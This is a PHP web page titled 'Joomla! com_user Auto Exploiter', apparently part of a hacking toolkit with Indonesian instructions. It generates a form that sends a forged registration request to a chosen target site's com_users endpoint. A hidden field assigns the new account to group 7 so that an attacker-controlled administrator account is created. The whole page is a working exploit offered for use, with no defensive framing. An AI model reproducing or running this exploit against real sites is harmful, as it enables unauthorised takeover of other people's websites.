<title>Com_User Exploit</title>
<?php
include("../head.php");
?>

<?php
$target = $_REQUEST['target'];
$token = $_REQUEST['token'];
$email = $_REQUEST['email'];
$submit = $_REQUEST['submit'];
if ($target == "") {
    $target = "localhost";
}
echo '
<html>
 <body>
<center><b><font face="tempus" color="black" size="5">[</font><font face="tempus" color="red" size="5">+</font><font face="tempus" color="black" size="5">] </font>
<font face="tempus" color="black" size="5">Joomla! com_user Auto Exploiter</font>
<font face="tempus" color="black" size="5"> [</font><font face="tempus" color="red" size="5">+</font><font face="tempus" color="black" size="5">]</font>
</b></center><br>';
echo '<center><br><br>';
echo '<font color="black" size="4">
<form method="post" action="">
Target :<br>
<input type="text" class="con7" name="target" value="site.com" size="25"><br>
Token :<br>
<input type="text" class="con7" name="token" value="" size="25"><br>
Email :<br>
<input type="text" class="con7" name="email" value="" size="25"><br>
<button type="submit" class="login" name="submit">Submit</button>
</form><br>';

echo '<form id="member-registration" action="http://'.$target.'/index.php?option=com_users&view=registration" method="post" class="form-validate">
<fieldset>
<legend>Konfirmasi</legend>
<dl><dt><span class="spacer"><span class="before"></span><span class="text"><label id="jform_spacer-lbl" class=""><strong class="red">*</strong> Required field</label></span><span class="after"></span></span>               </dt>
          <dd> </dd>';
    echo '<dt>
            <label id="jform_name-lbl" for="jform_name" class="hasTip required" title="Name::Enter your full name"></label>                        </dt>';
           echo '<dd><input type="hidden" name="jform[name]" id="jform_name" value="Joomla Exploiter" class="required" size="25"/></dd>
                            <dt>';
            echo '<label id="jform_username-lbl" for="jform_username" class="hasTip required" title="Username::Enter your desired user name">Username :</label>                        </dt>
       <dd><input type="text" name="jform[username]" id="jform_username" value="" class="validate-username required" size="25"/></dd>';
                               echo ' <dt>
            <label id="jform_password1-lbl" for="jform_password1" class="hasTip required" title="Password::Enter your desired password - Enter a minimum of 4 characters">Password :</label>                        </dt>
      <dd><input type="password" name="jform[password1]" id="jform_password1" value="" autocomplete="off" class="validate-password required" size="25"/></dd>';
                          echo '<dt>
            <label id="jform_password2-lbl" for="jform_password2" class="hasTip required" title="Confirm Password::Confirm your password">Confirm Password :</label>                        </dt>
      <dd><input type="password" name="jform[password2]" id="jform_password2" value="" autocomplete="off" class="validate-password required" size="25"/></dd>';
                            echo ' <dt>
            <label id="jform_email1-lbl" for="jform_email1" class="hasTip required" title="Email Address::Enter your email address"></label>                        </dt>
        <dd><input type="hidden" name="jform[email1]" class="validate-email required" id="jform_email1" value="'.$email.'" size="25"/></dd>';
                     echo '<dt>
            <label id="jform_email2-lbl" for="jform_email2" class="hasTip required" title="Confirm email Address::Confirm your email address">Email :</label>                    </dt>
        <dd><input type="text" name="jform[email2]" class="validate-email required" id="jform_email2" value="'.$email.'" size="25"/></dd>
<input type="hidden" name="jform[groups][]" value="7" size="25">
              </dl>';

echo '<hr>
<p><span style="color:#FF4747">Password pertama & kedua bedakan , ntar pass udah di web baru samakan !!!</span></p>
</fieldset>
      <div>
         <span class="wto-button-wrapper"><span class="wto-button-l"> </span><span class="wto-button-r"> </span><button type="submit" class="login">Exploit...!!</button></span>
         <input type="hidden" name="option" value="com_users" />
         <input type="hidden" name="task" value="registration.register" />
         <input type="hidden" name="'.$token.'" value="1" />      </div>
</form>';

echo '<hr>
exploit :<br>
index.php?option=com_users&view=registration<br>
<input name="jform[groups][]" value="7" size="25">
<hr><br>
</body></html>';
?>
